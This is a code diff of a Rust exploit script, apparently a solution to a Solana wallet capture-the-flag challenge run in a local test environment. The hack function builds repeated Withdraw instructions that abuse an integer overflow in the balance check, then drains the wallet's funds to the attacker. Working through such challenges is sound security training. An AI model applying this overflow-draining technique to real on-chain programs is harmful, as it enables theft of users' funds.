@@ -39,7 +39,8 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
         )],
         &[&_challenge.hacker],
     ));
-    let hacker_wallet = level2::get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);
+    let hacker_wallet =
+        level2::get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);
 
     // need to pass min_balance + amount <= hacker_wallet.lamports = 0
     // i.e. min_balance + amount = 0 (RHS cannot be overflowed)
@@ -51,8 +52,8 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
     let mut hacker_profit: u64 = _env.get_account(hacker_wallet).unwrap().lamports;
 
     // move funds to our wallet
-    let tx = _env.execute_as_transaction(
-        &[Instruction {
+    let create_hack_instr = |_i: u64| -> Instruction {
+        Instruction {
             program_id: _challenge.wallet_program,
             accounts: vec![
                 AccountMeta::new(hacker_wallet, false), // wallet_info
@@ -60,10 +61,21 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
                 AccountMeta::new(_challenge.wallet_address, false), // destination
                 AccountMeta::new_readonly(sysvar::rent::id(), false),
             ],
-            data: level2::WalletInstruction::Withdraw { amount: overflow }
-                .try_to_vec()
-                .unwrap(),
-        }],
+            data: level2::WalletInstruction::Withdraw {
+                amount: overflow,
+            }
+            .try_to_vec()
+            .unwrap(),
+        }
+    };
+    let tx = _env.execute_as_transaction(
+        &[
+            create_hack_instr(0),
+            // need it a second time so the actual withdraw below can pass the min_balance + amount <= wallet_info.lamports assert
+            create_hack_instr(1),
+            // might need it several more times such that hacker_balance > 1 SOL test passes because we also paid gas
+            create_hack_instr(2),
+        ],
         &[&_challenge.hacker],
     );
     tx.print_named("Hack: hacker overflow");
@@ -80,7 +92,7 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
                 AccountMeta::new(_challenge.hacker.pubkey(), false),
                 AccountMeta::new_readonly(sysvar::rent::id(), false),
             ],
-            data: level2::WalletInstruction::Withdraw { amount: 1 }
+            data: level2::WalletInstruction::Withdraw { amount: hacker_profit }
                 .try_to_vec()
                 .unwrap(),
         }],
